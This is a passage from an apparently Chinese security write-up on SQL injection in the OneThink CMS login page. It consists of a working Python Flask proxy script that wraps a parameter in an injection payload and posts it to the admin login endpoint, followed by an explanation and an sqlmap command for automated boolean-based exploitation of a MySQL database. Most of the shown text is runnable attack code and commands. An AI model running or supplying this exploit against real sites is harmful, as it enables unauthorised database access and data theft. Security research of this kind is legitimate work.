class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;burp0_url = &quot;http://one.think:80/index.php?s=/admin/public/login.html&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;burp0_headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# )) or 1=1 -- -</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pay = &quot;) =&#39; {} &#39;)-- -&quot;.format(payload) # )={payload} </span><span class="cs7FFD2630">）</span><span class="cs9FB05234">1 = 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(pay)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;burp0_data = {&quot;act&quot;: &quot;verify&quot;, &quot;username[0]&quot;: &#39;exp&#39;, &quot;username[1]&quot;: pay, &quot;password&quot;: &quot;&quot;, &quot;verify&quot;: &quot;&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return resp.text</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">app = Flask(__name__)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@app.route(&#39;/&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def login():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &nbsp;request.args.get(&quot;id&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response = remote_login(payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return response</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;app.run()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么经过这个转发脚本，原本复杂的参数被简化，你只需要在本地对</span><span class="cs9FB05234">http://127.0.0.1:5000/?id=1</span><span class="cs9C1B1871">跑</span><span class="cs8926E06">sqlmap</span><span class="cs9C1B1871">即可。原理上其实与写</span><span class="cs8926E06">tamper</span><span class="cs9C1B1871">脚本相同，都是让</span><span class="cs8926E06">sqlmap</span><span class="cs9C1B1871">能够识别出</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">简化过的</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">注入参数。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image14.png" width="560" height="228" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">python sqlmap.py -u http://127.0.0.1:5000/?id=1 &nbsp;--tech=B --dbms=mysql --batch</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/8081#toc-1</span></p></body>
</html>
